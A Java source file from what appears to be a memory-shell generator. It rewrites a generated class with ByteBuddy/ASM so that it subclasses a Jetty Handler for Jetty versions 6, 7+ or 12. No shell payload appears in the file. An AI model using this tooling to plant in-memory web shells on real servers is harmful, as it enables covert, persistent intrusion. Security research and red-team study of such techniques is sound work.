package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.buddy.ClassRenameVisitorWrapper;
import net.bytebuddy.asm.AsmVisitorWrapper;
import net.bytebuddy.description.field.FieldDescription;
import net.bytebuddy.description.field.FieldList;
import net.bytebuddy.description.method.MethodList;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.Implementation;
import net.bytebuddy.jar.asm.ClassVisitor;
import net.bytebuddy.jar.asm.MethodVisitor;
import net.bytebuddy.jar.asm.Opcodes;
import net.bytebuddy.pool.TypePool;

/**
 * @author ReaJason
 * @since 2025/12/2
 */
public class JettyHandlerGenerator {
    public static DynamicType.Builder<?> build(DynamicType.Builder<?> builder, String serverVersion) {
        String superClassName = null;
        DynamicType.Builder<?> newBuilder = builder;
        if (serverVersion != null) {
            switch (serverVersion) {
                case "6":
                    superClassName = "org/mortbay/jetty/handler/AbstractHandler";
                    newBuilder = newBuilder.visit(new ClassRenameVisitorWrapper("org/eclipse/jetty/server", "org/mortbay/jetty"));
                    break;
                case "7+":
                    superClassName = "org/eclipse/jetty/server/handler/AbstractHandler";
                    break;
                case "12":
                    superClassName = "org/eclipse/jetty/server/Handler$Abstract";
                    break;
            }
        }
        if (superClassName == null) {
            throw new GenerationException("serverVersion is needed for Jetty Handler or unknow serverVersion: [" + serverVersion + "], please use one of ['6', '7+', '12'] for shellConfig.serverVersion");
        }
        String finalSuperClassName = superClassName;
        return newBuilder.visit(new AsmVisitorWrapper.ForDeclaredMethods() {
            @Override
            public ClassVisitor wrap(TypeDescription instrumentedType,
                                     ClassVisitor classVisitor,
                                     Implementation.Context implementationContext,
                                     TypePool typePool,
                                     FieldList<FieldDescription.InDefinedShape> fields,
                                     MethodList<?> methods,
                                     int writerFlags,
                                     int readerFlags) {
                return new ClassVisitor(Opcodes.ASM9, classVisitor) {
                    @Override
                    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
                        super.visit(version, access, name, signature, finalSuperClassName, interfaces);
                    }

                    @Override
                    public MethodVisitor visitMethod(int access, String name, String descriptor,
                                                     String signature, String[] exceptions) {

                        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                        if (!name.equals("<init>")) {
                            return mv;
                        }
                        return new MethodVisitor(Opcodes.ASM9, mv) {
                            @Override
                            public void visitMethodInsn(int opcode, String owner, String name, String descriptor, boolean isInterface) {
                                if (opcode == org.objectweb.asm.Opcodes.INVOKESPECIAL &&
                                        "java/lang/Object".equals(owner) &&
                                        "<init>".equals(name)) {
                                    super.visitMethodInsn(opcode, finalSuperClassName, name, descriptor, isInterface);
                                } else {
                                    super.visitMethodInsn(opcode, owner, name, descriptor, isInterface);
                                }
                            }
                        };
                    }
                };

            }
        });
    }
}
